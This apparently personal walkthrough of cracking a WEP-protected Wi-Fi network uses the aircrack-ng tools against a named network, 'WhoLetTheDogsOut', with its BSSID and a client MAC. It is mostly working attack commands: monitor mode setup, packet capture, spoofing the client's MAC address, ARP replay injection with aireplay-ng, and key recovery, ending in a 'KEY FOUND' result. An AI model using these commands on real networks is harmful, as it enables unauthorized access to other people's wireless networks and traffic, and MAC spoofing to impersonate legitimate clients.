> ```
> Network: WhoLetTheDogsOut
> Channel: 1
> BSSID: A0:21:B7:F8:B7:DB
> Associated client: 00:1e:8f:93:80:9a
> ```

If this error is encountered:
> `SIOCSIFFLAGS: Operation not possible due to RF-kill`

Then run:
> `sudo rfkill unblock all`


airmon-ng start wlan0 [channel]
> ```
> sudo airmon-ng start wlan0 1
> ```
> This creates a new interface in monitor mode.


Terminal 1 (capture packets):
> ```
> sudo airodump-ng mon4 -c 1 -w packets
> ```

Terminal 2 (replay packets):
> ```
> sudo ifconfig wlan0 down
> sudo ifconfig wlan0 hw ether 00:1e:8f:93:80:9a
> sudo ifconfig wlan0 up
> sudo aireplay-ng -3 -b A0:21:B7:F8:B7:DB -h 00:1e:8f:93:80:9a -e WhoLetTheDogsOut --ignore-negative-one mon4
> ```

Terminal 3 (crack key):
> ```
> sudo aircrack-ng -z packets-01.cap
> KEY FOUND! [ 25:EC:24:44:41 ]
> Decrypted correctly: 100%
> ```

In Mac, prefix network key with `0x` to use hex.
